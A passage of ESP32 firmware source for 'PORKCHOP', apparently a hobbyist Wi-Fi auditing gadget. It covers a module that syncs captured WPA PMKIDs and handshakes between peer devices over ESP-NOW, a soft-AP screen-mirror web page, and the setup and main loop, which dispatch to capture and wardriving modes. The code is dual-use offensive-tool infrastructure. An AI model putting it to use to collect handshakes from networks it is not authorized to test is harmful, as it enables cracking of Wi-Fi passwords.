  _devices.erase(std::remove_if(_devices.begin(),_devices.end(),
    [now](const SirloinDevice&d){return now-d.lastSeen>5000;}),_devices.end());

  if(_scanning && _state==State::SCANNING && now-_lastDiscover>=PIGSYNC_DISCOVERY_INTERVAL) {
    _lastDiscover=now; _sendDiscover();
  }

  // ── Process BeaconGrunt ──
  if(_pendGrunt) {
    uint8_t mac[6]; uint8_t batt,caps; char nm[5];
    taskENTER_CRITICAL(&_pmux);
    memcpy(mac,(const void*)_pendGruntMac,6); batt=_pendGruntBatt; caps=_pendGruntCaps;
    memcpy(nm,(const void*)_pendGruntName,5); _pendGrunt=false;
    taskEXIT_CRITICAL(&_pmux);
    // Add/update device
    bool found=false;
    for(auto&d:_devices) if(memcmp(d.mac,mac,6)==0){d.lastSeen=now;d.pendingCaptures=caps;d.batteryPct=batt;d.hasGrunt=true;strncpy(d.name,nm,15);found=true;break;}
    if(!found && _devices.size()<10){ SirloinDevice d={}; memcpy(d.mac,mac,6); d.rssi=-60; d.pendingCaptures=caps; d.batteryPct=batt; d.lastSeen=now; d.hasGrunt=true; strncpy(d.name,nm,15); _devices.push_back(d); }
    Serial.printf("[PIGSYNC] Grunt from %s caps=%d batt=%d%%\n",nm,caps,batt);
  }

  // ── Process RSP_BEACON → add/update device ──
  if(_pendBeacon) {
    uint8_t mac[6]; int8_t rssi; uint16_t caps; uint8_t flags;
    taskENTER_CRITICAL(&_pmux);
    memcpy(mac,(const void*)_pendBeaconMac,6); rssi=_pendBeaconRSSI;
    caps=_pendBeaconCaptures; flags=_pendBeaconFlags; _pendBeacon=false;
    taskEXIT_CRITICAL(&_pmux);
    bool found=false;
    for(auto&d:_devices) if(memcmp(d.mac,mac,6)==0){d.rssi=rssi;d.pendingCaptures=caps;d.flags=flags;d.lastSeen=now;found=true;break;}
    if(!found && _devices.size()<10){ SirloinDevice d={}; memcpy(d.mac,mac,6); d.rssi=rssi; d.pendingCaptures=caps; d.flags=flags; d.lastSeen=now; _devices.push_back(d); }
    Serial.printf("[PIGSYNC] Beacon from %02X:%02X caps=%d\n",mac[0],mac[1],caps);
  }

  // ── State machine ─────────────────────────────────────────
  switch(_state) {
    case State::SCANNING:
      // Auto-connect to first device if found with captures
      for(uint8_t i=0;i<_devices.size();i++) {
        if(_devices[i].pendingCaptures>0) { _selectedIdx=i; break; }
      }
      break;

    case State::CONNECTING:
      if(_pendRing){taskENTER_CRITICAL(&_pmux);_pendRing=false;taskEXIT_CRITICAL(&_pmux); _state=State::RINGING;}
      if(_pendHello){ goto process_hello; }
      if(now-_connectStart>PIGSYNC_HELLO_TIMEOUT){ snprintf(_lastError,sizeof(_lastError),"No answer"); _state=State::ERROR; }
      break;

    case State::RINGING:
      if(_pendHello){ goto process_hello; }
      if(now-_connectStart>PIGSYNC_HELLO_TIMEOUT){ snprintf(_lastError,sizeof(_lastError),"No RSP_HELLO"); _state=State::ERROR; }
      break;

    process_hello: {
      uint16_t pmkids,hs,sid; uint8_t dlg,mood,dch;
      taskENTER_CRITICAL(&_pmux);
      pmkids=_pendPMKIDs; hs=_pendHS; dlg=_pendDialId; mood=_pendMood;
      sid=_pendSessId; dch=_pendDataCh; _pendHello=false;
      taskEXIT_CRITICAL(&_pmux);
      _sessionId=sid; _remotePMKIDs=pmkids; _remoteHS=hs;
      _dialogueId=dlg; _dialoguePhase=1; _phraseStart=now; _callStart=now;
      _dataChannel=dch;
      // Upgrade peer to encrypted on data channel
      esp_now_del_peer(_connMac);
      memset(&_peer,0,sizeof(_peer)); memcpy(_peer.peer_addr,_connMac,6);
      _peer.channel=dch; _peer.encrypt=true; memcpy(_peer.lmk,PIGSYNC_LMK,16);
      esp_now_add_peer(&_peer);
      esp_wifi_set_channel(dch,WIFI_SECOND_CHAN_NONE); delay(PIGSYNC_CHANNEL_SWITCH_MS);
      _ctrl={}; _sendReady();
      _state=State::WAITING_READY; _readyStart=now;
      Serial.printf("[PIGSYNC] Hello: %d PMKIDs %d HS ch%d\n",pmkids,hs,dch);
      break;
    }

    case State::WAITING_READY:
      if(_pendReady){
        taskENTER_CRITICAL(&_pmux); _pendReady=false; taskEXIT_CRITICAL(&_pmux);
        _ctrl={}; _state=State::CONNECTED;
        Serial.println("[PIGSYNC] Connected — ready to sync");
        // Kick off sync immediately
        _sendBounties();
        if(_remotePMKIDs>0||_remoteHS>0) {
          _curType=(_remotePMKIDs>0)?CAPTURE_TYPE_PMKID:CAPTURE_TYPE_HANDSHAKE;
          _curIdx=0; _rxLen=0; _chunkCount=0;
          for(auto&c:_chunkQ)c.used=false;
          _sendStartSync(_curType,_curIdx);
          _state=State::WAITING_CHUNKS;
        }
      }
      if(now-_readyStart>PIGSYNC_READY_TIMEOUT){ snprintf(_lastError,sizeof(_lastError),"No RSP_READY"); _state=State::ERROR; }
      break;

    case State::CONNECTED:
      break;

    case State::WAITING_CHUNKS:
      if(_pendChunk) {
        _pendChunk=false;
        // Drain chunk queue, reassemble _rxBuf
        for(uint8_t i=0;i<PS_CHUNK_Q;i++) {
          ChunkSlot&s=_chunkQ[i];
          if(!s.used) continue;
          _sendAckChunk(s.seq);
          // Append chunk data at correct offset
          uint32_t off=(uint32_t)s.seq*PIGSYNC_MAX_PAYLOAD;
          if(off+s.len<=PS_RX_BUF) {
            memcpy(_rxBuf+off,s.data,s.len);
            if(off+s.len>_rxLen) _rxLen=off+s.len;
          }
          if(s.total>0) _totalChunks=s.total;
          s.used=false; _chunkCount--;
        }
      }
      if(_pendComplete) {
        uint16_t tb; uint32_t crc;
        taskENTER_CRITICAL(&_pmux); tb=_pendTotalBytes; crc=_pendCRC; _pendComplete=false; taskEXIT_CRITICAL(&_pmux);
        // Verify CRC
        uint32_t myCRC=_ps_crc32(_rxBuf,_rxLen);
        if(myCRC==crc) {
          // Deserialize and inject
          if(_curType==CAPTURE_TYPE_PMKID) {
            CapturedPMKID pm; if(_parsePMKID(_rxBuf,_rxLen,pm)){
              OinkMode::injectPMKID(pm); SpiffsSave::savePMKIDs();
              XP::addPMKID(); _syncedPMKIDs++;
              Display::showToast("PIGSYNC PMKID!",2000);
              Serial.printf("[PIGSYNC] PMKID synced: %s\n",pm.ssid);
            }
          } else {
            CapturedHandshake hs2; if(_parseHS(_rxBuf,_rxLen,hs2)){
              OinkMode::injectHandshake(hs2); SpiffsSave::saveHandshakes();
              XP::addHS(); _syncedHS++;
              Display::showToast("PIGSYNC HS!",2000);
              Serial.printf("[PIGSYNC] HS synced: %s\n",hs2.ssid);
            }
          }
          _sendMarkSynced(_curType,_curIdx);
          // Advance to next capture
          _curIdx++; _rxLen=0; _chunkCount=0;
          for(auto&c:_chunkQ)c.used=false;
          // Check if we need more
          bool needMore=false;
          if(_curType==CAPTURE_TYPE_PMKID && _curIdx<_remotePMKIDs) needMore=true;
          else if(_curType==CAPTURE_TYPE_PMKID && _remoteHS>0){ _curType=CAPTURE_TYPE_HANDSHAKE; _curIdx=0; needMore=true; }
          else if(_curType==CAPTURE_TYPE_HANDSHAKE && _curIdx<_remoteHS) needMore=true;
          if(needMore) { _sendStartSync(_curType,_curIdx); }
          else { _sendPurge(); _state=State::SYNC_COMPLETE; _syncCompleteTime=now; }
        } else {
          Serial.printf("[PIGSYNC] CRC fail! got=%08X want=%08X\n",myCRC,crc);
          snprintf(_lastError,sizeof(_lastError),"CRC fail");
          // Retry same capture
          _rxLen=0; _chunkCount=0; for(auto&c:_chunkQ)c.used=false;
          _sendStartSync(_curType,_curIdx);
        }
      }
      if(now-_lastPktTime>PIGSYNC_TRANSFER_TIMEOUT && _lastPktTime>0){
        snprintf(_lastError,sizeof(_lastError),"Transfer timeout"); _state=State::ERROR;
      }
      break;

    case State::SYNC_COMPLETE:
      if(_pendPurged){
        uint16_t purged; uint8_t bounty;
        taskENTER_CRITICAL(&_pmux); purged=_pendPurgedCnt; bounty=_pendBounty; _pendPurged=false; taskEXIT_CRITICAL(&_pmux);
        _lastBounty=bounty;
        _dialoguePhase=2; _phraseStart=now;
        Serial.printf("[PIGSYNC] Purged: %d captures, %d bounty matches\n",purged,bounty);
      }
      // After dialogue, disconnect
      if(_dialoguePhase>=2 && now-_phraseStart>2500) {
        _dialoguePhase=3;
        if(_connected){ _sendDisconnectCmd(); delay(20); esp_now_del_peer(_connMac); _connected=false; }
        esp_wifi_set_channel(PIGSYNC_DISCOVERY_CHANNEL,WIFI_SECOND_CHAN_NONE);
        _dataChannel=PIGSYNC_DISCOVERY_CHANNEL; _state=State::IDLE;
      }
      break;

    case State::ERROR:
      // Stay in ERROR, UI shows message, hold to dismiss
      break;

    default: break;
  }
}

// ── Public connect trigger (from UI) ─────────────────────────
bool connectTo(uint8_t idx) {
  if(idx>=_devices.size()) return false;
  const SirloinDevice&d=_devices[idx];
  memcpy(_connMac,d.mac,6);
  // Add peer (unencrypted for initial handshake)
  esp_now_peer_info_t p={}; memcpy(p.peer_addr,_connMac,6);
  p.channel=PIGSYNC_DISCOVERY_CHANNEL; p.encrypt=false;
  esp_now_del_peer(_connMac); esp_now_add_peer(&p);
  _connected=true; _connectStart=millis(); _helloRetry=0; _chanRetry=0; _ctrl={};
  _state=State::CONNECTING;
  _sendHello();
  Serial.printf("[PIGSYNC] Connecting to %02X:%02X:%02X:%02X:%02X:%02X\n",
    _connMac[0],_connMac[1],_connMac[2],_connMac[3],_connMac[4],_connMac[5]);
  return true;
}

// ── Public getters ────────────────────────────────────────────
bool isRunning()    { return _running; }
bool isScanning()   { return _scanning; }
bool isConnected()  { return _connected; }
bool isSyncing()    { return _state==State::WAITING_CHUNKS||_state==State::SYNCING; }
bool isSyncComplete(){ return _state==State::SYNC_COMPLETE; }
State getState()    { return _state; }
const char* getStateName() {
  switch(_state){
    case State::IDLE:          return "IDLE";
    case State::SCANNING:      return "SCANNING";
    case State::CONNECTING:    return "CONNECTING";
    case State::RINGING:       return "RINGING";
    case State::WAITING_READY: return "HANDSHAKING";
    case State::CONNECTED:     return "CONNECTED";
    case State::SYNCING:
    case State::WAITING_CHUNKS:return "SYNCING";
    case State::SYNC_COMPLETE: return "COMPLETE";
    case State::ERROR:         return "ERROR";
  }
  return "?";
}
const char* getLastError()    { return _lastError; }
uint8_t getDeviceCount()      { return (uint8_t)_devices.size(); }
const SirloinDevice* getDevice(uint8_t i){ return i<_devices.size()?&_devices[i]:nullptr; }
uint8_t getSelectedIdx()      { return _selectedIdx; }
void    setSelectedIdx(uint8_t i){ if(i<_devices.size())_selectedIdx=i; }
uint16_t getRemotePMKIDs()    { return _remotePMKIDs; }
uint16_t getRemoteHS()        { return _remoteHS; }
uint16_t getSyncedPMKIDs()    { return _syncedPMKIDs; }
uint16_t getSyncedHS()        { return _syncedHS; }
uint8_t  getLastBounty()      { return _lastBounty; }
uint8_t  getDialoguePhase()   { return _dialoguePhase; }
uint8_t  getDialogueId()      { return _dialogueId; }
const char* getPapaHello()    { return PAPA_HELLO[_dialogueId%3]; }
const char* getSonHello()     { return SON_HELLO[_dialogueId%3]; }
const char* getSonGoodbye()   { return SON_GOODBYE[_dialogueId%3]; }

} // namespace PigSync

// ============================================================
// WEBUI — soft AP screen mirror
// Connect phone/laptop to "PORKCHOP" WiFi → browse 192.168.4.1
// ============================================================
namespace WebUI {

// Minimal HTML page — polls /screen every 300ms, renders on canvas
static const char INDEX_HTML[] PROGMEM = R"RAW(<!DOCTYPE html>
<html><head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>PORKCHOP</title>
<style>
body{background:#111;display:flex;flex-direction:column;align-items:center;
     justify-content:center;min-height:100vh;margin:0;font-family:monospace;color:#f92a}
h1{font-size:1.2em;margin:0 0 8px;letter-spacing:3px}
canvas{image-rendering:pixelated;border:2px solid #f92a;width:320px;height:200px}
#status{font-size:0.7em;margin-top:6px;color:#888}
</style></head><body>
<h1>&#128055; PORKCHOP</h1>
<canvas id='c' width='160' height='100'></canvas>
<div id='status'>connecting...</div>
<script>
const canvas=document.getElementById('c');
const ctx=canvas.getContext('2d');
const status=document.getElementById('status');
let fps=0,frames=0,lastFps=Date.now();
function rgb565toRgba(data,buf){
  const view=new DataView(buf);
  const id=ctx.createImageData(160,100);
  const px=id.data;
  for(let i=0;i<160*100;i++){
    const v=view.getUint16(i*2,false); // big-endian
    px[i*4]  =(v>>8)&0xF8;
    px[i*4+1]=(v>>3)&0xFC;
    px[i*4+2]=(v<<3)&0xF8;
    px[i*4+3]=255;
  }
  return id;
}
async function poll(){
  try{
    const r=await fetch('/screen',{cache:'no-store'});
    if(!r.ok){status.textContent='error '+r.status;setTimeout(poll,1000);return;}
    const buf=await r.arrayBuffer();
    ctx.putImageData(rgb565toRgba(null,buf),0,0);
    frames++;
    const now=Date.now();
    if(now-lastFps>=1000){fps=frames;frames=0;lastFps=now;}
    status.textContent=fps+'fps | '+Math.round(buf.byteLength/1024)+'KB/frame';
    setTimeout(poll,300);
  }catch(e){status.textContent='lost connection';setTimeout(poll,2000);}
}
poll();
</script></body></html>)RAW";

void start() {
  // Start soft AP alongside STA mode (WIFI_AP_STA keeps scanning working)
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(WEBUI_AP_SSID, WEBUI_AP_PASS[0] ? WEBUI_AP_PASS : nullptr);
  webServer.begin();
  webUIActive = true;
  Serial.printf("[WEBUI] AP: %s  IP: %s\n", WEBUI_AP_SSID, WiFi.softAPIP().toString().c_str());
  Display::showToast("WEBUI: 192.168.4.1", 4000);
}

void stop() {
  webServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  webUIActive = false;
  Serial.println("[WEBUI] stopped");
  Display::showToast("WEBUI OFF", 2000);
}

// Serve one pending client request — call from loop(), non-blocking
void update() {
  if (!webUIActive) return;
  WiFiClient client = webServer.available();
  if (!client) return;

  // Read request line (just need GET path)
  char reqLine[64] = {};
  uint8_t pos = 0;
  uint32_t start = millis();
  while (client.connected() && millis() - start < 500) {
    if (client.available()) {
      char c = client.read();
      if (c == '\n') break;
      if (pos < 63) reqLine[pos++] = c;
    }
  }
  // Drain remaining headers
  while (client.connected() && client.available()) client.read();

  bool isScreen = (strstr(reqLine, "GET /screen") != nullptr);
  bool isRoot   = (strstr(reqLine, "GET / ") != nullptr || strstr(reqLine, "GET /\r") != nullptr);

  if (isRoot) {
    // Serve the HTML page
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: text/html");
    client.println("Connection: close");
    client.print("Content-Length: ");
    client.println(strlen_P(INDEX_HTML));
    client.println();
    // Send HTML in chunks to avoid large stack buffer
    const char* p = INDEX_HTML;
    char chunk[128];
    while (pgm_read_byte(p)) {
      uint8_t n = 0;
      while (n < 127 && pgm_read_byte(p)) chunk[n++] = pgm_read_byte(p++);
      chunk[n] = 0;
      client.print(chunk);
    }
  } else if (isScreen) {
    // Read sprite at half resolution (160×100) and stream RGB565 big-endian
    // Sprite is 320×200 16bpp — sample every other pixel in each dimension
    const uint16_t W = 160, H = 100;
    const uint32_t bodyLen = W * H * 2;

    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: application/octet-stream");
    client.println("Access-Control-Allow-Origin: *");
    client.println("Cache-Control: no-cache");
    client.print("Content-Length: ");
    client.println(bodyLen);
    client.println();

    // Stream in row chunks to avoid any large allocation
    uint8_t rowBuf[W * 2];
    for (uint16_t y = 0; y < H; y++) {
      for (uint16_t x = 0; x < W; x++) {
        uint16_t px = mainSprite.readPixel(x * 2, y * 2);
        // Send big-endian so JS DataView.getUint16(i,false) works directly
        rowBuf[x * 2]     = px >> 8;
        rowBuf[x * 2 + 1] = px & 0xFF;
      }
      client.write(rowBuf, sizeof(rowBuf));
    }
  } else {
    client.println("HTTP/1.1 404 Not Found");
    client.println("Connection: close");
    client.println();
  }
  client.stop();
}

bool isActive() { return webUIActive; }

} // namespace WebUI

// ============================================================
// SETUP
// ============================================================
void setup() {
  Serial.begin(115200);
  delay(100);
  Serial.println("\n=== PORKCHOP CYD v6 STARTING ===");
  Serial.printf("[HEAP] startup: free=%u largest=%u\n", ESP.getFreeHeap(), heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));

  // SD CS high (prevent SPI bus issues)
  pinMode(SD_CS_PIN,OUTPUT); digitalWrite(SD_CS_PIN,HIGH);

  // LEDs off (active LOW)
  pinMode(LED_R_PIN,OUTPUT); digitalWrite(LED_R_PIN,HIGH);
  pinMode(LED_G_PIN,OUTPUT); digitalWrite(LED_G_PIN,HIGH);
  pinMode(LED_B_PIN,OUTPUT); digitalWrite(LED_B_PIN,HIGH);

  // Backlight on
  pinMode(TFT_BL_PIN,OUTPUT); digitalWrite(TFT_BL_PIN,HIGH);

  // TFT
  tft.begin(); tft.setRotation(1); tft.fillScreen(TFT_BLACK);

  // SD FIRST — its ~30KB DMA/FAT buffers must be allocated before WiFi and sprite
  // to avoid fragmenting the heap. VSPI default pins: CLK=18 MISO=19 MOSI=23 CS=5
  Serial.printf("[SD] Pre-init heap: %u largest: %u\n", ESP.getFreeHeap(), heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
  pinMode(SD_CS_PIN, OUTPUT); digitalWrite(SD_CS_PIN, HIGH);
  delay(10);
  SPI.begin(18, 19, 23, SD_CS_PIN);
  {
    const uint8_t SD_CS_CANDIDATES[] = { SD_CS_PIN, 26 };
    for (uint8_t ci = 0; ci < 2 && !sdAvailable; ci++) {
      uint8_t cs = SD_CS_CANDIDATES[ci];
      Serial.printf("[SD] Trying CS=%d on VSPI(18/19/23)...\n", cs);
      pinMode(cs, OUTPUT); digitalWrite(cs, HIGH);
      delay(20);
      for (int attempt = 0; attempt < 3 && !sdAvailable; attempt++) {
        Serial.printf("[SD]   attempt %d @ 400kHz...\n", attempt+1);
        if (SD.begin(cs, SPI, 400000)) {
          sdAvailable = true;
          uint8_t ct = SD.cardType();
          Serial.printf("[SD] OK on CS=%d type=%s %lluMB\n", cs,
            ct==CARD_MMC?"MMC":ct==CARD_SD?"SD":ct==CARD_SDHC?"SDHC":"UNKNOWN",
            SD.totalBytes() / (1024*1024));
        } else {
          Serial.printf("[SD]   failed\n");
          SD.end();
          delay(100);
        }
      }
      if (!sdAvailable && ci == 0) {
        SPI.end(); delay(10);
        SPI.begin(18, 19, 23, SD_CS_CANDIDATES[1]);
      }
    }
    if (!sdAvailable) {
      SPI.end();
      Serial.println("[SD] Not found — check: FAT32 format, card seated");
    }
  }
  Serial.printf("[SD] Post-init heap: %u largest: %u\n", ESP.getFreeHeap(), heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));

  // WiFi — after SD so its buffers don't fragment around SD's allocation
  WiFi.persistent(false); WiFi.mode(WIFI_STA); WiFi.disconnect(true,false);
  WiFi.setSleep(false); delay(200);

  loadConfig();

  // Sprite allocated last — gets largest remaining contiguous block
  Display::init();
  tft.fillScreen(colorBG());
  Display::showBootSplash();

  // Touch on custom VSPI pins (25/39/32) — different from SD's default VSPI (18/19/23)
  touchSPI.begin(TOUCH_CLK_PIN,TOUCH_MISO_PIN,TOUCH_MOSI_PIN,TOUCH_CS_PIN);
  touch.begin(touchSPI); touch.setRotation(1);

  // Init subsystems
  Avatar::init();
  Mood::init();
  XP::init();
  Challenges::generate();
  Mood::resetChallengeHype();

  // Load persisted captures from SPIFFS
  SpiffsSave::loadAll();

#if GPS_ENABLED
  Serial2.begin(GPS_BAUD,SERIAL_8N1,GPS_RX_PIN,GPS_TX_PIN);
  Serial.println("[GPS] started");
#endif

  bootTime=millis();

  // Start NetworkRecon in IDLE
  NetworkRecon::start();
  // Hook new-network callback for mood/XP
  NetworkRecon::setNewNetworkCallback([](wifi_auth_mode_t auth, bool hidden, const char* ssid, int8_t rssi, uint8_t ch){
    networkCount++;
    XP::addNet();
    Mood::onNewNetwork(ssid, rssi, ch);
  });

  Weather::init();
  startScan();

  Serial.printf("[BOOT] Free heap: %u largest: %u\n",
                ESP.getFreeHeap(), heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
  Serial.println("=== PORKCHOP CYD v6 READY ===");
}

// ============================================================
// LOOP
// ============================================================
void loop() {
#if GPS_ENABLED
  while(Serial2.available()) gps.encode(Serial2.read());
  if(gps.location.isValid()){
    gpsHasFix=true; gpsLat=gps.location.lat(); gpsLon=gps.location.lng();
    gpsSpeedKmh=gps.speed.kmph(); gpsSats=gps.satellites.value();
  } else { gpsHasFix=false; gpsSats=gps.satellites.value(); }
#endif

  // ── Serial phrase entry for UNLOCKABLES (no physical keyboard on CYD) ──
  if (currentMode == PorkchopMode::UNLOCKABLES && Serial.available()) {
    static char _serialBuf[64]; static uint8_t _serialLen=0;
    while (Serial.available()) {
      char c = Serial.read();
      if (c=='\n'||c=='\r') {
        if (_serialLen>0) {
          _serialBuf[_serialLen]=0;
          // Convert to lowercase
          for(uint8_t i=0;i<_serialLen;i++) _serialBuf[i]=tolower(_serialBuf[i]);
          // SHA256 verify
          uint8_t hash[32]; char hexHash[65];
          mbedtls_sha256_context ctx; mbedtls_sha256_init(&ctx);
          mbedtls_sha256_starts(&ctx,0);
          mbedtls_sha256_update(&ctx,(const uint8_t*)_serialBuf,_serialLen);
          mbedtls_sha256_finish(&ctx,hash); mbedtls_sha256_free(&ctx);
          for(int i=0;i<32;i++) sprintf(&hexHash[i*2],"%02x",hash[i]); hexHash[64]=0;
          // Check all 4 unlockables
          static const char* ULHASHES[4]={
            "13ca9c448763034b2d1b1ec33b449ae90433634c16b50a0a9fba6f4b5a67a72a",
            "6c58bc00fea09c8d7fdb97c7b58741ad37bd7ba8e5c76d35076e3b57071b172b",
            "73d7b7288d31175792d8a1f51b63936d5683718082f5a401b4e9d6829de967d3",
            "af062b87461d9caa433210fc29a6c1c2aaf28c09c6c54578f16160d7d6a8caa0"
          };
          bool matched=false;
          for(uint8_t i=0;i<4;i++){
            if(strcmp(hexHash,ULHASHES[i])==0 && !XP::hasUnlockable(i)){
              XP::setUnlockable(i); matched=true;
              Display::showToast("UNLOCKED",3000);
              Serial.printf("[UNLOCKABLES] Bit %d unlocked!\n",i);
              break;
            }
          }
          if(!matched) { Display::showToast("WRONG PHRASE",2000); Serial.println("[UNLOCKABLES] Wrong phrase"); }
          _serialLen=0;
        }
      } else if (_serialLen<62) { _serialBuf[_serialLen++]=c; }
    }
  }

  // Update active mode
  switch(currentMode){
    case PorkchopMode::OINK_MODE:       OinkMode::update(); break;
    case PorkchopMode::DNH_MODE:        DNHMode::update(); break;
    case PorkchopMode::WARHOG_MODE:     WarhogMode::update(); break;
    case PorkchopMode::PIGGYBLUES_MODE: PiggyBlues::update(); break;
    case PorkchopMode::BACON_MODE:      BaconMode::update(); break;
    case PorkchopMode::BOAR_BROS:       PigSync::update(); break;
    default:
      // Idle/menu: keep NetworkRecon running + passive STA scans
      NetworkRecon::update();
      checkScan();
      if(!scanInProgress && millis()-lastScanTime>SCAN_INTERVAL_MS) startScan();
      break;
  }

  Mood::update();
  // Deferred achievement from riddle system (Mood can't call XP directly due to declaration order)
  if (Mood::riddlePendingAch) {
    Mood::riddlePendingAch = false;
    if (!XP::hasAchievement(ACH_PROPHECY_WITNESS)) XP::unlockAchievement(ACH_PROPHECY_WITNESS);
  }
  HeapHealth::update();
  WebUI::update();
  Weather::setMoodLevel(Mood::getCurrentHappiness());
  Weather::update();
  handleInput();
  Display::update();

  static uint32_t lastHeapLog=0, lastXPSave=0;
  uint32_t now=millis();
  if(now-lastHeapLog>10000){
    lastHeapLog=now;
    Serial.printf("[HEAP] free=%u largest=%u\n",
                  ESP.getFreeHeap(), heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
  }
  if(now-lastXPSave>60000){ lastXPSave=now; XP::save(); }

  delay(Display::isToastActive() ? 120 : 16); // ~8fps during toast, ~60fps normally
}
